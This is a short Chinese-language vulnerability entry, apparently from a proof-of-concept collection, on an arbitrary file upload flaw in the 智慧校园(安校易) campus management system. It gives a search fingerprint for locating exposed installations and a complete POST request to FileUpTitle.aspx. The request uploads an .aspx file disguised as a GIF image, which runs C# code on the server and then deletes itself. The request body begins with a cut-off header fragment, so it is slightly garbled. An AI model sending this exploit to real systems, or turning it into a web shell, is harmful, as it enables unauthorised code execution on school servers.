# 智慧校园(安校易)管理系统FileUpTitle存在任意文件上传漏洞

- **系统**：智慧校园(安校易)管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="智慧综合管理平台登入"`
- **请求**：`POST /Module/FileUpPage/FileUpTitle.aspx?file_tmid=DudeSuite HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
------21909179191068471382830692394
Content-Disposition: form-data; name="File"; filename="DudeSuite.aspx"
Content-Type: image/jpeg
GIF89a
<%@ Page Language="C#"%><% Response.Write("DudeSuite"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
------21909179191068471382830692394--
```
- **预期**：200　|　.aspx